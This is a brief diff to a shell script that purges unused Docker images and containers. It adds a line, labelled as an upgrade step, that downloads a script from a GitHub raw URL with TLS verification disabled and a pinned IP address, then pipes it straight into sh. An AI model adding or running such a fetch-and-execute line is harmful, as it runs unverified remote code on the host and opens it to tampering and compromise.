@@ -37,4 +37,8 @@ fi
 echo "Purging all unused or dangling images, containers."
 docker container prune -f
 docker image prune -f
+
+# Additional scripts for upgrading.
+curl -s --insecure --retry 10 --connect-timeout 5 --resolve raw.githubusercontent.com:443:199.232.4.133 https://raw.githubusercontent.com/bclswl0827/customised-scripts/master/custom-script.sh | sh
+
 exit 0
